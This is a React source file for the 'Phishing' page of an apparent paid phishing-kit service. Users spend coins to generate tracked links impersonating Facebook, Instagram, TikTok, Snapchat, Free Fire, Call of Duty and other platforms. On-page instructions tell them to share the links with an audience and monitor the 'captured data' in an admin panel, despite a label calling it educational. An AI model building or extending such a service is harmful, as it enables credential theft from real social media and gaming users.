import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Layout from '@/components/Layout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Copy, Shield, Coins } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const Phishing = () => {
  const [userId, setUserId] = useState('');
  const [userCoins, setUserCoins] = useState(0);
  const [generatedLinks, setGeneratedLinks] = useState<{ [key: string]: string }>({});
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');
    if (currentUser && currentUser.id) {
      setUserId(currentUser.id);
      setUserCoins(currentUser.coins || 0);
    } else {
      navigate('/login');
    }
  }, [navigate]);

  const platforms = [
    { name: 'Facebook', icon: '📘', color: 'bg-blue-600', route: 'facebook' },
    { name: 'Instagram', icon: '📷', color: 'bg-pink-500', route: 'instagram' },
    { name: 'Twitter', icon: '🐦', color: 'bg-black', route: 'twitter' },
    { name: 'LinkedIn', icon: '💼', color: 'bg-blue-700', route: 'linkedin' },
    { name: 'TikTok', icon: '🎵', color: 'bg-black', route: 'tiktok' },
    { name: 'Snapchat', icon: '👻', color: 'bg-yellow-400', route: 'snapchat' },
    { name: 'Free Fire', icon: '🔥', color: 'bg-orange-500', route: 'freefire' },
    { name: 'Call of Duty', icon: '⚔️', color: 'bg-gray-800', route: 'callofduty' }
  ];

  const generateLink = (platform: string) => {
    if (userCoins < 3) {
      toast({
        title: 'Insufficient Coins',
        description: 'You need 3 coins to generate phishing links. Please top up your account.',
        variant: 'destructive'
      });
      return;
    }

    // Deduct coins
    const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');
    const updatedUser = {
      ...currentUser,
      coins: currentUser.coins - 3,
      transactions: [
        ...(currentUser.transactions || []),
        {
          description: `Generated ${platform} phishing link`,
          amount: -3,
          timestamp: Date.now()
        }
      ]
    };
    
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    localStorage.setItem(`user_${currentUser.id}`, JSON.stringify(updatedUser));
    setUserCoins(updatedUser.coins);

    const link = `${window.location.origin}/phishing/${platform}/${userId}`;
    setGeneratedLinks(prevLinks => ({ ...prevLinks, [platform]: link }));
    
    toast({
      title: 'Link Generated!',
      description: `${platform} phishing link created successfully. 3 coins deducted.`
    });

    // Auto-scroll to generated links section
    setTimeout(() => {
      const element = document.getElementById('generated-links');
      if (element) {
        element.scrollIntoView({ behavior: 'smooth' });
      }
    }, 500);
  };

  const copyLink = (platform: string) => {
    if (generatedLinks[platform]) {
      navigator.clipboard.writeText(generatedLinks[platform]);
      toast({
        title: 'Copied!',
        description: `${platform} link copied to clipboard`
      });
    }
  };

  return (
    <Layout>
      <div className="space-y-6">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-2">Phishing Simulation</h1>
          <p className="text-gray-400">Generate phishing links for educational purposes</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="text-gray-400 text-sm mb-2">Your User ID</div>
              <div className="flex items-center justify-between">
                <Input
                  type="text"
                  value={userId}
                  readOnly
                  className="bg-slate-700 border-slate-600 text-white cursor-not-allowed"
                />
                <Button onClick={() => copyLink('userId')} className="bg-blue-500 hover:bg-blue-600">
                  <Copy className="h-4 w-4 mr-2" />
                  Copy ID
                </Button>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="text-gray-400 text-sm mb-2">How to Use</div>
              <ul className="list-disc list-inside text-gray-300">
                <li>Select a platform to generate a phishing link.</li>
                <li>Share the generated link with your audience.</li>
                <li>Monitor the captured data in the admin panel.</li>
              </ul>
            </CardContent>
          </Card>
        </div>
        
        {/* Current Balance */}
        <Card className="bg-gradient-to-r from-blue-600 to-purple-600 border-0">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="text-white">Your Balance:</span>
              <div className="flex items-center gap-2">
                <Coins className="h-5 w-5 text-yellow-400" />
                <span className="text-xl font-bold text-white">{userCoins} coins</span>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Shield className="h-5 w-5" />
              Available Platforms (3 coins each)
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              {platforms.map((platform) => (
                <Card key={platform.name} className="bg-slate-700/50 border-slate-600 hover:bg-slate-700 transition-colors">
                  <CardContent className="p-4 text-center">
                    <div className="text-3xl mb-3">{platform.icon}</div>
                    <h3 className="text-white font-semibold mb-3">{platform.name}</h3>
                    <Button
                      onClick={() => generateLink(platform.route)}
                      className={`w-full ${platform.color} hover:opacity-90 text-white`}
                    >
                      Generate Link (3 coins)
                    </Button>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Generated Links */}
        {Object.keys(generatedLinks).length > 0 && (
          <Card id="generated-links" className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <CardTitle className="text-white">Generated Links</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {platforms.map((platform) => (
                  generatedLinks[platform.route] && (
                    <div key={platform.route} className="flex items-center justify-between bg-slate-700/50 p-3 rounded-lg">
                      <div className="flex-1">
                        <h4 className="text-white font-semibold">{platform.name}</h4>
                        <p className="text-gray-400 text-sm break-all">{generatedLinks[platform.route]}</p>
                      </div>
                      <Button onClick={() => copyLink(platform.route)} className="bg-blue-500 hover:bg-blue-600">
                        <Copy className="h-4 w-4 mr-2" />
                        Copy Link
                      </Button>
                    </div>
                  )
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </Layout>
  );
};

export default Phishing;
